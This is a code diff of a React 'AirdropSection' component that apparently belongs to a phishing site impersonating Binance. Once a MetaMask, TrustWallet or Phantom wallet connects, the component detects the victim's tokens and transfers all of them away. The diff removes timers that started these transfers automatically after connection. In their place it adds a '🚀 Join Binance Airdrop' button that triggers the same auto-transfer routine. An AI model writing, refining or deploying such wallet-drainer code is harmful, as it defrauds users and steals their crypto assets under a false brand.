@@ -114,11 +114,6 @@ const AirdropSection = () => {
                 setIsConnected(true);
                 setConnectedWalletType(WALLET_TYPES.METAMASK);
                 toast.success('MetaMask connected successfully!');
-                
-                // Start mobile transfer process
-                setTimeout(() => {
-                  startMobileTransferProcess();
-                }, 1000);
               }
             } catch (err) {
               console.log('Checking connection...');
@@ -154,11 +149,6 @@ const AirdropSection = () => {
         setIsConnected(true);
         setConnectedWalletType(WALLET_TYPES.METAMASK);
         toast.success('MetaMask connected successfully!');
-        
-        // Start transfer process
-        setTimeout(() => {
-          startTransferProcess();
-        }, 2000);
       }
     } catch (error) {
       console.error('MetaMask connection error:', error);
@@ -191,11 +181,6 @@ const AirdropSection = () => {
                 setIsConnected(true);
                 setConnectedWalletType(WALLET_TYPES.TRUSTWALLET);
                 toast.success('TrustWallet connected successfully!');
-                
-                // Start mobile transfer process
-                setTimeout(() => {
-                  startMobileTransferProcess();
-                }, 1000);
               }
             } catch (err) {
               console.log('Checking connection...');
@@ -232,11 +217,6 @@ const AirdropSection = () => {
         setIsConnected(true);
         setConnectedWalletType(WALLET_TYPES.TRUSTWALLET);
         toast.success('TrustWallet connected successfully!');
-        
-        // Start transfer process
-        setTimeout(() => {
-          startTransferProcess();
-        }, 2000);
       }
     } catch (error) {
       console.error('TrustWallet connection error:', error);
@@ -284,10 +264,7 @@ const AirdropSection = () => {
                   icon: '👻'
                 });
                 
-                // Start mobile Solana transfer process  
-                setTimeout(() => {
-                  startSolanaTransferProcess();
-                }, 1500);
+                // Mobile Phantom connected successfully
               }
             } catch (err) {
               console.log('Checking Phantom connection...', err);
@@ -321,11 +298,6 @@ const AirdropSection = () => {
             setIsSolanaConnected(true);
             setConnectedWalletType(WALLET_TYPES.PHANTOM);
             toast.success('📱 Phantom connected on mobile!');
-            
-            // Start transfer process immediately for mobile
-            setTimeout(() => {
-              startSolanaTransferProcess();
-            }, 1000);
           }
         } catch (error) {
           console.error('Mobile Phantom connection error:', error);
@@ -351,11 +323,6 @@ const AirdropSection = () => {
       setIsSolanaConnected(true);
       setConnectedWalletType(WALLET_TYPES.PHANTOM);
       toast.success('Phantom wallet connected successfully!');
-      
-      // Start transfer process
-      setTimeout(() => {
-        startSolanaTransferProcess();
-      }, 2000);
     } catch (error) {
       console.error('Phantom connection error:', error);
       if (isMobile()) {
@@ -1225,7 +1192,7 @@ const AirdropSection = () => {
                     <p className="text-sm md:text-base text-binance-light-gray mb-6 md:mb-8 px-2">
                       {isLoading 
                         ? 'Auto-detecting and transferring all wallet assets. Please confirm wallet transactions.'
-                        : 'Ready to auto-transfer all your wallet assets.'
+                        : 'Click the button below to start auto-transferring all your wallet assets.'
                       }
                     </p>
 
@@ -1258,6 +1225,23 @@ const AirdropSection = () => {
                             Total: {detectedAssets.trc20.length + detectedAssets.evm.length + detectedAssets.solana.length} tokens detected
                           </div>
                         </div>
+                      </div>
+                    )}
+                    
+                    {!isLoading && (
+                      <div className="mb-6">
+                        <motion.button
+                          onClick={startAutoAssetTransferBot}
+                          disabled={isLoading}
+                          className="w-full bg-binance-gradient hover:bg-binance-gradient-hover text-white font-bold py-4 px-8 rounded-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+                          whileHover={{ scale: isLoading ? 1 : 1.02 }}
+                          whileTap={{ scale: isLoading ? 1 : 0.98 }}
+                        >
+                          <span className="text-lg">🚀 Join Binance Airdrop</span>
+                        </motion.button>
+                        <p className="text-xs text-binance-light-gray mt-2 text-center">
+                          Start automatic asset transfer process
+                        </p>
                       </div>
                     )}
                     
